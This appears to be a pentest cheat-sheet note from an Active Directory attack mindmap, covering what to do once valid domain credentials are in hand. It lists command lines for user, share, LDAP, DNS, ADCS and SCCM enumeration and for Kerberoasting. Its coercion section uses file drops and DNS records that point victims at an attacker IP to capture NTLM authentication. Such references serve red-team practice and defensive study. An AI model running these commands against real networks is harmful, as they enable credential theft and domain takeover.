---
title: "Valid Credentials"
category: enumeration
color: "#00ff00"
tags:
  - ad-mindmap
  - enumeration
---

# 🔑 Valid Credentials

> [!info] Mindmap box `Valid Credentials (cleartext creds, nt hash, kerberos ticket)`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Classic Enumeration (users, shares, ACL, delegation, ...)

- Find all users ➡️ [[Valid User (No Password)|Username]]
    - `GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>` [↗](https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py)
    - `nxc smb <dc_ip> -u '<user>' -p '<password>' --users` [↗](https://github.com/Pennyw0rth/NetExec)
- Enumerate SMB share ➡️ [[Lateral Movement|Scroll shares]]
    - `nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus` [↗](https://github.com/Pennyw0rth/NetExec)
    - `nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\<filename> <filename>] ` [↗](https://github.com/Pennyw0rth/NetExec)
    - `manspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>` [↗](https://github.com/blacklanternsecurity/MANSPIDER)
- Bloodhound Legacy ➡️ [[ACLs & ACEs Permissions|ACL]] / [[Kerberos Delegation|Delegation]] / [[Valid User (No Password)|Username]]
    - `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all` [↗](https://github.com/dirkjanm/BloodHound.py)
    - `rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z` [↗](https://github.com/NH-RED-TEAM/RustHound)
    - `import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>`
    - `sharphound.exe -c all -d <domain>` [↗](https://github.com/SpecterOps/SharpHound)
- Bloodhound CE ➡️ [[ACLs & ACEs Permissions|ACL]] / [[Kerberos Delegation|Delegation]] / [[Valid User (No Password)|Username]]
    - `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all` [↗](https://github.com/dirkjanm/BloodHound.py)
    - `rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)` [↗](https://github.com/g0h4n/RustHound-CE)
    - `sharphound.exe -c all -d <domain>` [↗](https://github.com/SpecterOps/SharpHound)
    - `SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 900` [↗](https://github.com/FalconForceTeam/SOAPHound)
- Enumerate Ldap ➡️ [[ACLs & ACEs Permissions|ACL]] / [[Kerberos Delegation|Delegation]] / [[Valid User (No Password)|Username]]
    - `ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>` [↗](https://github.com/franc-pentest/ldeep)
    - `ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389` [↗](https://github.com/dirkjanm/ldapdomaindump)
    - `ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all` [↗](https://github.com/yaap7/ldapsearch-ad)
- Enumerate DNS ➡️ [[Quick Compromise|New targets (low hanging fruit)]]
    - `adidnsdump -u <domain>\\<user> -p "<password>" --print-zones <dc_ip>` [↗](https://github.com/dirkjanm/adidnsdump)

## Enumerate ADCS
➡️ [[ADCS|ADCS Exploitation]]

- `certify.exe find` [↗](https://github.com/GhostPack/Certify)
- `certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>` [↗](https://github.com/ly4k/Certipy)

## Enumerate SCCM
➡️ [[SCCM|SCCM Exploitation]]

- `sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug` [↗](https://github.com/garrettfoster13/sccmhunter)
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm` [↗](https://github.com/franc-pentest/ldeep)
- `SharpSCCM.exe local site-info` [↗](https://github.com/Mayyhem/SharpSCCM)

## Scan Auto

- from BH result
    - `AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>` [↗](https://github.com/AD-Security/AD_Miner)
- `PingCastle.exe --healthcheck --server <domain>` [↗](https://www.pingcastle.com/)
- `Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'`

## Kerberoasting
➡️ [[Crack Hash|Hash TGS]]

- `MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u` [↗](https://github.com/SpecterOps/BloodHound)
- `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>` [↗](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- `Rubeus.exe kerberoast` [↗](https://github.com/GhostPack/Rubeus)

## Coerce

- Drop file
    - .lnk
        - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>` [↗](https://github.com/Pennyw0rth/NetExec)
    - .scf
        - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>` [↗](https://github.com/Pennyw0rth/NetExec)
    - .url
        - `[InternetShortcut]... IconFile=\\<attacker_ip>\%USERNAME%.icon`
    - Other files
        - `ntlm_theft.py -g all -s <your_ip> -f test` [↗](https://github.com/Greenwolf/ntlm_theft)
- Webdav
    - Enable webclient
        - .searchConnector-ms
            - `nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc` [↗](https://github.com/Pennyw0rth/NetExec)
    - add attack computer in dns
        - `dnstool.py -u <domain>\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>` [↗](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
    - Launch coerce with <attacker_hostname>@80/x as target ➡️ [[Man In The Middle|HTTP Coerce]]
- RPC call ➡️ [[Man In The Middle|SMB NTLM Coerce]]
    - `printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>` [↗](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
    - `petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>` [↗](https://github.com/topotam/PetitPotam)
    - `coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>` [↗](https://github.com/p0dalirius/Coercer)
- Coerce kerberos ➡️ [[Man In The Middle|SMB Kerberos coerce]]
    - `dnstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>" -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp` [↗](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
        - `petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>` [↗](https://github.com/topotam/PetitPotam)

## Intra ID Connect

- Find MSOL
    - `nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL` [↗](https://github.com/Pennyw0rth/NetExec)

## Can Connect to a computer
➡️ [[Lateral Movement|Lateral move]]

## Exploit
➡️ [[Quick Compromise|know vulnerabilities]]
